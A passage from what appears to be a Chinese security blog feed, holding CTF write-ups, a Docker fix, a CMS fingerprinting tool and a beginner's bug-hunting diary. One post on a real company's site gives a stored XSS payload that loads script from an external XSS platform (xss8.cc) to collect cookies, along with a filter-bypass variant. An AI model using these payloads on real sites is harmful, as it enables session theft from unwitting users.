src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf24.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、按F5查看伪代码，并点击sub_401050子函数<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf25.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、不难看出下列是一个10进制到ASCII码的转换<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf26.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、利用在线网站转换即可获得flag，网站地址：<a href="http://ctf.ssleye.com/jinzhi.html">http://ctf.ssleye.com/jinzhi.html</a><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf27.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x09-Android-RE"><a href="#0x09-Android-RE" class="headerlink" title="0x09 Android RE"></a>0x09 Android RE</h1><pre class="line-numbers language-none"><code class="language-none">flag:DDCTF-397a90a3267641658bbc975326700f4b@didichuxing.com题目：安卓逆向flag格式：DDCTF-Hint:flag中包含chuxing题目来源：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;1103<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1、这道题是滴滴出行的一道CTF，下载题目可以看到一个apk文件，先在模拟器中运行看看是个什么东西<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf28.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、功能很简单，一个输入框，输错会提示Wrong，那么利用Android killer给它反编译一下，查找字符“Wrong”<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf29.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、可以看到Wrong字符的路径，接下来进行反编译，不过可能由于本身软件的文件，反编译提示未找到对应的APK源码，没关系，换ApkIDE对其进行编译<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf30.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf31.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、等待一段时间后，可以看到对应源码，简单分析就可以知道该代码从hello-libs.so文件加载，并且对mFlagEntryView.getText().toString()函数的内容即我们输入的内容和stringFromJNI()函数的内容做判断，如果一致就Correct，即正确，不一致就返回Wrong，即错误，那么接下来只需要分析stringFromJNI()的内容就行了，因此我们需要知道系统从hello-libs.so文件加载了什么<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf32.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、将APK解压，找到hello-libs.so文件，由于现在手机都是用arm64位的CPU（我也不知道是不是的啊，听别人说的），因此我们找到arm64-v8a文件夹下的libhello-libs.so文件，用IDA打开<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf33.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf34.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>6、打开IDA后，根据题目提示，Alt +T　查找chuxing<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf35.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>７、成功找到flag（<a href="mailto:&#68;&#x44;&#x43;&#x54;&#70;&#45;&#51;&#x39;&#x37;&#97;&#57;&#x30;&#x61;&#51;&#50;&#x36;&#55;&#x36;&#x34;&#49;&#54;&#53;&#56;&#x62;&#x62;&#99;&#x39;&#55;&#x35;&#51;&#x32;&#x36;&#x37;&#x30;&#48;&#x66;&#52;&#98;&#x40;&#100;&#105;&#x64;&#x69;&#x63;&#x68;&#117;&#x78;&#x69;&#x6e;&#x67;&#46;&#99;&#x6f;&#109;">&#68;&#x44;&#x43;&#x54;&#70;&#45;&#51;&#x39;&#x37;&#97;&#57;&#x30;&#x61;&#51;&#50;&#x36;&#55;&#x36;&#x34;&#49;&#54;&#53;&#56;&#x62;&#x62;&#99;&#x39;&#55;&#x35;&#51;&#x32;&#x36;&#x37;&#x30;&#48;&#x66;&#52;&#98;&#x40;&#100;&#105;&#x64;&#x69;&#x63;&#x68;&#117;&#x78;&#x69;&#x6e;&#x67;&#46;&#99;&#x6f;&#109;</a><br>）输入到模拟器中看到提示Correct，说明flag正确。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf36.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x10-Easy-dump"><a href="#0x10-Easy-dump" class="headerlink" title="0x10 Easy_dump"></a>0x10 Easy_dump</h1><pre class="line-numbers language-none"><code class="language-none">flag：F0rens1cs_St2rt题目：Easy_dumpflag格式：LCTF&#123;&#125;Hint：volatilty了解一下题目来源：https:&#x2F;&#x2F;www.tr0y.wang&#x2F;2016&#x2F;12&#x2F;16&#x2F;MiniLCTF&#x2F;index.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>解法一：</strong><br>1、下载题目文件，提示利用volatilty工具，同时结合文件后缀为vmem（VMWare的虚拟内存文件），因此判断是一个内存取证的题目，关于volatilty的使用可以参考官方手册：<a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference">https://github.com/volatilityfoundation/volatility/wiki/Command-Reference</a>，废话不多说，先看看镜像信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># volatility -f xp.vmem imageinfo</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf37.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、可以看到该镜像信息的为WinXPSP2x86，接下来直接扫描查看一些系统文件中有没有flag文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># volatility -f xp.vmem --profile=WinXPSP2x86 filescan | grep flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf38.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、将该flag.txt文件dump下来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># volatility -f xp.vmem --profile=WinXPSP2x86 dumpfiles -Q 0x0000000005ab74c8 -D ./ -u</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf39.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、直接cat flag文件即可看到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf40.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><strong>解法二：</strong><br>因为该题作者将flag复制到了自己电脑的粘贴板里的，所以直接获取粘贴板的内容也是可以看到flag的，不过谁能想到这种操作 [笑哭]</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># volatility -f xp.vmem clipboard</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf41.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>以上就是本次我为他们准备的CTF的全部内容，大多数都是很基础的题目，平时拿来练练手还是不错的，拓宽一下自己的了解面，发现一些自己以前不知道的东西，如果你也想拿上面的题目来玩玩，在公众号（TeamsSix）回复CTF就可以获取下载地址哦。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验总结】记录一次Docker下安装CTFd的错误</title>
      <link href="//190720-121144.html"/>
      <url>//190720-121144.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-提示错误"><a href="#0x01-提示错误" class="headerlink" title="0x01 提示错误"></a>0x01 提示错误</h1><p>根据官方的步骤执行docker-compose up但是我得到了这样的一个错误</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/docker_CTFd1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">~/CTFd<span class="token comment"># docker-compose up</span>ERROR: The Compose <span class="token function">file</span> <span class="token string">'./docker-compose.yml'</span> is invalid because:networks.internal value Additional properties are not allowed <span class="token punctuation">(</span><span class="token string">'internal'</span> was unexpected<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>经过多次查询后，是因为版本问题导致，因此需要将原来的docker-compose版本卸载，安装新版本。</p><h1 id="0x02-安装新版本"><a href="#0x02-安装新版本" class="headerlink" title="0x02 安装新版本"></a>0x02 安装新版本</h1><p>卸载docker-compose版本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip uninstall docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先升级一下pip</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> –upgrade pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>继续安装新版本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> -U docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用国内pip源进行加速，我使用的国内源进行的安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> -i https://pypi.tuna.tsinghua.edu.cn/simple -U docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后再执行docker-compose up就没有问题了<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/docker_CTFd2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>平时遇到问题还是需要先根据提示自己一步一步去找解决方法，之后再利用好Google。</p><blockquote><p>参考文章：<a href="https://www.ilanni.com/?p=13371">https://www.ilanni.com/?p=13371</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> CTFd </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分享一张超详细的渗透测试导图</title>
      <link href="//190717-124041.html"/>
      <url>//190717-124041.html</url>
      
        <content type="html"><![CDATA[<p>这是Github上看到的一张渗透测试思维导图，超级详细，在此分享。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>图片来源地址：<a href="https://github.com/iSafeBlue/Mind-Map">https://github.com/iSafeBlue/Mind-Map</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思维导图 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具】批量网站CMS指纹识别</title>
      <link href="//190715-102622.html"/>
      <url>//190715-102622.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><ul><li>使用Python3开发</li><li>结果导出为Output_Result.csv文件</li><li>使用在线平台（<a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a>）进行指纹识别</li><li>项目下载地址：<a href="https://github.com/teamssix/Batch-identification-of-website-CMS-fingerprints">Batch-identification-of-website-CMS-fingerprints</a></li></ul><h1 id="0x02-使用方法"><a href="#0x02-使用方法" class="headerlink" title="0x02 使用方法"></a>0x02 使用方法</h1><a id="more"></a><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> -r requirements.txtpython3 Batch_CMS_identification.py url.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-注意事项"><a href="#0x03-注意事项" class="headerlink" title="0x03 注意事项"></a>0x03 注意事项</h1><ul><li>url.txt文件中地址格式需要http开头，如<a href="http://www.teamssix.com/">http://www.teamssix.com</a></li><li>如果执行过程中出现警告，一般是碰到有些网站使用的https的情况，可以不用理会，对结果没有影响。</li><li>如果想重新运行程序，请确认导出的CSV文件没有被打开，否则将因为不能导出文件而报错</li><li>程序中途想要退出，可以直接Ctrl+C退出，等待一段时间后便会退出，结果会依然保存</li><li>如果程序经常提示连接异常，可能因为对方拒绝连接或者本地网速较慢，如果本地网速延时较高，可将程序中的两处timeout调高一些，为保证速度，默认timeout为1秒。</li><li>该平台每天有1500的使用限制。</li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 批量工具 </tag>
            
            <tag> 指纹识别 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验总结】小白挖洞十天经验分享</title>
      <link href="//190709-202131.html"/>
      <url>//190709-202131.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>十天是指六月三十号到七月九号这十天的时间，这段时间正值暑假刚开始，虽然知道现在需要备战考研，但是看了几天书后却怎么也看不进去，这时刚好有个作业就是挖洞，于是再一次把考研的书扔到了一边。<br>事先声明一下，因为是小白挖洞分享，所以难免会存在错误的地方，希望多多指正与包涵。<br>其实自己早在一年前就有挖洞的想法，在那个时候虽然知道很多工具的使用方法，但是对于如何挖洞依旧一头雾水，慢慢的一年的时间就在自我否定与怀疑自己中过去了，因此今天分享的第一点就是要相信自己。</p><a id="more"></a><h1 id="0x02-相信自己"><a href="#0x02-相信自己" class="headerlink" title="0x02 相信自己"></a>0x02 相信自己</h1><p>这四个字，估计每个人都听过，但是如果没有这四个字，我估计我现在还在犹豫、怀疑自己、不敢去挖洞的环境中。毕竟一件事情如果还没有去做就开始否定自己，那结局注定是失败的，连开始的勇气都没有，又怎能谈何成功。<br>所以如果你现在正处在想要开始挖洞却又不知道从哪里下手的情况时，那就先打开漏洞平台，补天、漏洞盒子什么的都行，注册个账号，接下来该干什么且听我一一道来。</p><h1 id="0x03-看清自己"><a href="#0x03-看清自己" class="headerlink" title="0x03 看清自己"></a>0x03 看清自己</h1><p>这四个字，是说要明白自己有几斤几两，也就是说要有自知之明，为什么这样说呢，因为你如果上来就挖专属SRC、企业SRC的话，估计会挖到怀疑人生，所以刚开始还是先从公益SRC入手，补天上上百个公益SRC，总能找到那么几个是存在漏洞的，注意，这里说总能找到那么几个，也就是说挖不挖得着看运气咯？<br>事实上，我确实是这样的，挖不挖得到完全看运气，有时运气好了，一个站碰到很多漏洞，低危、中危、高危都齐了，有时候啥也挖不到，而这种看似运气不好的时候往往占据了很大比重，但在我看来，归根结底就两点原因：一是经验不足，二是过早放弃。<br>经验不足没事儿，多挖就行，时间可以解决，过早放弃却不是那么容易解决的，下面我们就来好好唠唠这点。</p><h1 id="0x04-总结记录"><a href="#0x04-总结记录" class="headerlink" title="0x04 总结记录"></a>0x04 总结记录</h1><p>这四个字，很容易理解，那和刚才说的过早放弃又有什么关系呢？<br>首先我们一起来想想为什么会过早的放弃，在我看来还是不相信自己，在这个时候你已经有勇气开始挖洞了，但是在挖洞的过程中碰到了困难，所以就想到了放弃。<br>打开网页看到底部的360Logo，于是关闭网页，继续下一个公益SRC；在URL参数后面加引号回车一看，知道创宇为您保驾护航，于是关闭网页，继续下一个公益SRC；突然发现有个网站存在有漏洞的CMS，于是打开hackbar，Loadurl，加上Payload，Execute执行，一顿操作猛如虎，网站却提示你提交的数据包含非法字符，于是关闭网页，继续下一个公益SRC。<br>其实这就是我刚开始几天的真实写照，慢慢的发现，这样可不行，太打击人了吧，于是开始有了 自己的总结，有了自己的挖洞思路。<br>我自己写的总结就是记录整个挖洞过程，不管最后有没有挖到，都给记录下来，比如先看这个网站用的什么语言、操作系统、数据库版本，之后再看这个网站有没有用CMS，接着继续记录这个网站哪里可能存在漏洞，但自己没有复现出来，又或者这个网站的登陆页面是什么，自己注册了什么账号等等，反正只要稍微有些价值的信息都给记录下来，那记录这有什么用，只是为了记录吗？当然不是，首先一点就是过几天或者过段时间之后通过之前的记录你可能会找到当时没有复现出来的漏洞，还有另外一点在我看来也是很重要的一点，就是形成自己的挖洞思路。<br>在我挖了几天之后，慢慢的心中就有了一个大概的挖洞步骤，之后便记录了下来，比如刚开始我一般利用Google Hacking去收集一些网站的登陆窗口什么的，刚开始就各种弱密码碰运气，期间还真碰到一个管理员弱密码的站，之后发现有些网站公告里会提到默认密码多少多少，于是继续Google Hacking搜索网站相关的公开默认密码，又或者找到存在发送短信的地方，看看有没有短信轰炸等逻辑漏洞，之后又去批量识别网站CMS，对存在低版本的网站进行Nday攻击等等，慢慢的自己就形成了一个挖洞思路，而且随着经验的不断丰富，这样的一份漏洞挖掘思路报告也会越来越详细，说到这里，不知道你有没有想到过早放弃和总结经验之间的联系。<br>当你开始总结经验的时候，开始去记录开始去总结的那一刻，如果你碰到了问题，没关系，你可以看看自己总结的挖洞思路中还有没有记录其他的方法，如果真的已经没有思路了，那也没关系，把刚才渗透这个网站获取到的信息记录下来之后，开始下一个网站的漏洞挖掘。这时你应该发现，此时已经不存在什么过早放弃的概念了，因为当记录的那一刻起，以后如果有什么新的奇淫技巧依旧可以翻翻看看，挖到高危都是没准的事儿，最后就再说一点关于学习的事儿。</p><h1 id="0x05-终身学习"><a href="#0x05-终身学习" class="headerlink" title="0x05 终身学习"></a>0x05 终身学习</h1><p>这四个字，很重要，但熟悉我的人知道，我的成绩很一般，因为我不太喜欢学习，这里说的学习是指学习自己不感兴趣的东西，而对于我自己感兴趣的东西，那可真是太喜欢了。<br>这是挖洞十天经验分享，以后或许会有挖洞十月经验分享，亦或者会有挖洞十年经验分享，不管技术怎么发展变化，保持一个终身学习的心态始终不至于和时代脱节，尤其在网安的圈子，终身学习更是至关重要。如果你的兴趣不在网安，我想本文同样适用于你，不论什么领域什么方向，首先要踏出第一步，其次看清自己几斤几两，最后在不断的失败中去总结成长。<br>看到现在，相信你也发现刚才说的那么多更多的是经验分享，没有太多的挖洞技巧，毕竟人家还是个小白萌新，关于挖洞技巧在我的公众号（TeamsSix）会有分享，可以关注关注，如果本视频对你有帮助，欢迎点赞收藏一键三连，好了，汤家凤、朱伟他们还等着我呢，拜拜。</p><p>本文视频：</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=58541759&cid=102097106&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div><p>如果视频不能全屏播放，请点击<a href="https://www.bilibili.com/video/av58541759/" title="源链接">源链接</a>进行观看。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 经验总结 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 小白 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【渗透实例】记录一次XSS渗透过程</title>
      <link href="//190703-221956.html"/>
      <url>//190703-221956.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-找到存在XSS的位置"><a href="#0x01-找到存在XSS的位置" class="headerlink" title="0x01 找到存在XSS的位置"></a>0x01 找到存在XSS的位置</h1><p>没什么技巧，见到框就X，功夫不负有心人，在目标网站编辑收货地址处发现了存在XSS的地方，没想到这种大公司还会存在XSS。</p><a id="more"></a><pre class="line-numbers language-none"><code class="language-none">使用的XSS代码：&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-构造XSS代码连接到XSS平台"><a href="#0x02-构造XSS代码连接到XSS平台" class="headerlink" title="0x02 构造XSS代码连接到XSS平台"></a>0x02 构造XSS代码连接到XSS平台</h1><p>XSS平台给我们的XSS代码是这样的：</p><pre class="line-numbers language-none"><code class="language-none">&lt;&#x2F;tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC&#x3D;https:&#x2F;&#x2F;xss8.cc&#x2F;3Ri4&gt;&lt;&#x2F;sCrIpT&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>直接插入的话会提示参数非法，经过多次尝试，最后发现该平台会对双引号、script字符进行识别过滤，大小写会被过滤，于是尝试插入下面的语句:</p><pre class="line-numbers language-none"><code class="language-none">&lt;&#x2F;tExtArEa&gt;&#39;\&quot;&gt;&lt;\sCRiPt sRC&#x3D;https:&#x2F;&#x2F;xss8.cc&#x2F;3Ri4&gt;&lt;&#x2F;\sCrIpT&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条代码比上面平台给的XSS代码的多了几个 “&quot;，也就是转义字符，利用转义字符可以绕过该平台的策略，因为经验不足，所以在这一步尝试了很多种办法都没能绕过，要不有的可以插入但是连不上XSS平台，要不有的就是被识别拦截。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>加上转义字符成功插入后，刷新目标网站与XSS平台页面，在XSS平台就能看到刚才的访问记录。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>这里可以获取该登陆用户的Cookie、User-Agent、IP地址什么的，但是触发这个XSS需要登陆存在XSS的账号才行，所以个人觉着知道了这个Cookie也没啥用。<br>并且虽然知道这里存在XSS，但是触发条件是需要知道用户名和密码，然后来到收货地址页面，所以个人感觉作用不大，因此在想这个漏洞还有没有其他的利用价值，后续或许会继续更新本次渗透过程，如果你有什么好的想法，欢迎下方留言。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透实例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> 渗透实例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python实例】让Python告诉你B站观影指南</title>
      <link href="//190619-202702.html"/>
      <url>//190619-202702.html</url>
      
